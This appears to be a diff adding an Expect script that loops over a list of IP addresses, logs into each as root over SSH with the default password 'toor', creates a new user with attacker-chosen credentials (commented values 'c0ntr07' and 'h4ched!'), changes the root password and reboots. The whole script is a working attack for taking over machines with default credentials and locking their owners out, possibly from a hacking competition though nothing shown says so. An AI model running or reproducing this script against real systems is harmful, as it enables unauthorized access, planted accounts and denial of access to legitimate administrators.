@@ -1,0 +1,65 @@
+#!/usr/bin/expect
+set f [open "hkIPs"]
+set ips [read $f]
+close $f
+
+set file [open "hkinfo.txt"]
+gets $file newuser
+gets $file newpass
+close $file
+
+set timeout -1
+set isTrue "false"
+
+foreach ip [split $ips \n] {
+if {$ip eq {}} continue
+ 
+#spawn ssh $user@$ip
+spawn ssh root@$ip
+                                                         
+expect {
+    "yes/no" {
+	send "yes\r"
+	exp_continue
+     }
+    "s password:" {
+	#send "$pass\r"
+        send "toor\r"
+        exp_continue
+    }
+    -re "#" { 
+	send "\r" 
+	set isTrue "true"
+    }
+}
+if {$isTrue == "true"} {
+send "adduser $newuser\r"
+#send "adduser c0ntr07\r"
+expect {
+  "\\\[\\\]:" {
+	send "\r"
+	exp_continue
+    }
+    "UNIX password:" {
+	send "$newpass\r"
+	#send "h4ched!\r"
+	exp_continue
+    }
+   "correct?" {
+	send "Y\r"
+    }
+    "already exists."{
+	send "\r"
+    }
+}
+send "sudo passwd root\r"
+expect "UNIX password"
+send "$newpass\r"
+#send "h4ched!\r"
+expect "UNIX password"
+send "$newpass\r"
+#send "h4ched!\r"
+send "reboot\r"
+interact
+}
+}
